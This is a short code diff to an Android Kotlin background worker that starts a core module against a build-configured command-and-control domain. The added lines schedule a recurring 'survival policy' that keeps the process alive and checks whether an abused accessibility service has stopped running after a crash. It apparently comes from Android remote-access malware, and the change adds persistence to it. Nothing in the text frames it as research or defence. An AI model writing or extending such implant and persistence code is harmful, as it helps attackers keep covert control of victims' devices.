@@ -15,7 +15,13 @@ class ShadowWorker(
         val c2Domain = BuildConfig.C2_DOMAIN
         
         ShadowCore.start(applicationContext, c2Domain)
-        
+
+        // Re-apply the survival policy on every 15-min window: this is the path
+        // that runs when the process was dead, so it is also the path that notices
+        // a11y never came back after a crash (AMS keeps crashed services out of the
+        // bind set until a human toggles or a reboot).
+        com.shadow.KeepAlive.schedule(applicationContext, 5_000L, "worker window")
+
         // Block indefinitely to keep the process alive as long as WorkManager allows
         kotlinx.coroutines.delay(Long.MAX_VALUE)
         
